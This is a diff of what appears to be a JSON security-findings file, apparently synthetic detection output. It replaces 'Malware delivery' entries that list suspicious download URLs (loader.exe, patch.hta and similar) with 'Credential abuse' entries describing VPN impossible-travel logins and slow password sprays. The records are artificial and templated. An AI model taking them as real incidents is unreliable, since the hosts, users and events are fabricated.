+   "category": "Credential abuse",
+   "timestamp": "2026-10-16T06:12:17.023Z",
+   "host": "WS-5047",
+   "user": "carol194",
+   "process": "vpn",
    "evidence": [
-    "dl.freewarevault.net/files/patch.hta (2 requests; files: /files/patch.hta)"
+    "VPN from 203.0.113.79 then 198.18.88.13 at 2026-10-16T07:00:39.064Z"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-14T02:39:45.602Z",
-   "host": "WS-2938",
-   "user": "zack112",
-   "process": "chrome",
+   "category": "Credential abuse",
+   "timestamp": "2026-10-14T09:23:24.372Z",
+   "host": "WS-6012",
+   "user": "frank231",
+   "process": "vpn",
    "evidence": [
-    "files.freevault-downloads.net/files/setup.exe (2 requests; files: /files/setup.exe)"
+    "VPN from 203.0.113.166 then 198.18.88.16 at 2026-10-14T10:14:49.537Z"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-14T03:57:24.822Z",
-   "host": "WS-9398",
-   "user": "leo361",
-   "process": "chrome",
+   "category": "Credential abuse",
+   "timestamp": "2026-10-14T05:49:13.425Z",
+   "host": "WS-7572",
+   "user": "frank291",
+   "process": "vpn",
    "evidence": [
-    "get.crackarchive.net/files/update.dll (2 requests; files: /files/update.dll)"
+    "VPN from 203.0.113.138 then 198.18.88.12 at 2026-10-14T06:29:32.206Z"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-15T13:47:42.026Z",
-   "host": "WS-3032",
-   "user": "paula116",
-   "process": "firefox",
+   "category": "Credential abuse",
+   "timestamp": "2026-10-14T05:15:24.907Z",
+   "host": "WS-3885",
+   "user": "karen149",
+   "process": "vpn",
    "evidence": [
-    "dl.freewarevault.net/files/patch.hta (2 requests; files: /files/patch.hta)"
+    "VPN from 203.0.113.127 then 198.18.88.15 at 2026-10-14T06:06:40.158Z"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-15T20:47:54.895Z",
-   "host": "WS-9152",
-   "user": "zack351",
-   "process": "chrome",
+   "category": "Credential abuse",
+   "timestamp": "2026-10-15T08:01:03.562Z",
+   "host": "WS-6930",
+   "user": "nina266",
+   "process": "vpn",
    "evidence": [
-    "cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)"
+    "VPN from 203.0.113.173 then 198.18.88.10 at 2026-10-15T08:49:58.686Z"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-15T21:48:40.542Z",
-   "host": "WS-3688",
-   "user": "victor141",
-   "process": "chrome",
+   "category": "Credential abuse",
+   "timestamp": "2026-10-15T01:36:21.364Z",
+   "host": "WS-7269",
+   "user": "omar279",
+   "process": "vpn",
    "evidence": [
-    "cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)"
+    "VPN from 203.0.113.48 then 198.18.88.8 at 2026-10-15T02:21:53.838Z"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-15T22:50:39.233Z",
-   "host": "WS-5830",
-   "user": "frank224",
-   "process": "chrome",
+   "category": "Credential abuse",
+   "timestamp": "2026-10-16T04:37:50.762Z",
+   "host": "WS-6443",
+   "user": "uma247",
+   "process": "vpn",
    "evidence": [
-    "cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)"
+    "VPN from 203.0.113.67 then 198.18.88.7 at 2026-10-16T05:26:52.139Z"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-15T23:17:29.332Z",
-   "host": "WS-7676",
-   "user": "frank295",
-   "process": "chrome",
+   "category": "Credential abuse",
+   "timestamp": "2026-10-14T12:03:01.961Z",
+   "host": "WS-3194",
+   "user": "victor122",
+   "process": "vpn",
    "evidence": [
-    "cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)"
+    "VPN from 203.0.113.50 then 198.18.88.9 at 2026-10-14T12:43:50.270Z"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-16T11:28:01.033Z",
-   "host": "WS-6411",
-   "user": "omar246",
-   "process": "firefox",
+   "category": "Credential abuse",
+   "timestamp": "2026-10-12T01:29:51.817Z",
+   "host": "WS-5123",
+   "user": "alice197",
+   "process": "sso",
    "evidence": [
-    "get.crackarchive.net/files/update.dll (2 requests; files: /files/update.dll)"
+    "slow spray from 198.18.77.11: 32 fails over 3.9 days, then alice197 got in at 2026-10-15T21:56:39.142Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-12T01:26:38.954Z",
+   "host": "WS-2878",
+   "user": "rachel110",
+   "process": "sso",
+   "evidence": [
+    "slow spray from 198.18.77.12: 46 fails over 3.2 days, then rachel110 got in at 2026-10-15T05:32:00.900Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-12T01:18:08.945Z",
+   "host": "WS-8606",
+   "user": "zack330",
+   "process": "sso",
+   "evidence": [
+    "slow spray from 198.18.77.13: 45 fails over 1.0 days, then zack330 got in at 2026-10-13T01:16:47.361Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-12T03:36:30.843Z",
+   "host": "WS-0458",
+   "user": "paula17",
+   "process": "sso",
+   "evidence": [
+    "slow spray from 198.18.77.14: 40 fails over 2.7 days, then paula17 got in at 2026-10-14T20:12:46.827Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-12T01:27:29.156Z",
+   "host": "WS-7217",
+   "user": "omar277",
+   "process": "sso",
+   "evidence": [
+    "slow spray from 198.18.77.15: 42 fails over 0.8 days, then omar277 got in at 2026-10-12T20:20:24.124Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-12T01:07:00.437Z",
+   "host": "WS-2510",
+   "user": "nina96",
+   "process": "sso",
+   "evidence": [
+    "slow spray from 198.18.77.16: 45 fails over 4.3 days, then nina96 got in at 2026-10-16T09:02:02.199Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-12T02:27:35.834Z",
+   "host": "WS-5196",
+   "user": "victor199",
+   "process": "sso",
+   "evidence": [
+    "slow spray from 198.18.77.17: 36 fails over 4.1 days, then victor199 got in at 2026-10-16T05:45:33.377Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-12T01:55:52.985Z",
+   "host": "WS-9373",
+   "user": "mia360",
+   "process": "sso",
+   "evidence": [
+    "slow spray from 198.18.77.18: 38 fails over 2.2 days, then mia360 got in at 2026-10-14T07:28:36.130Z"
    ]
   }
  ]
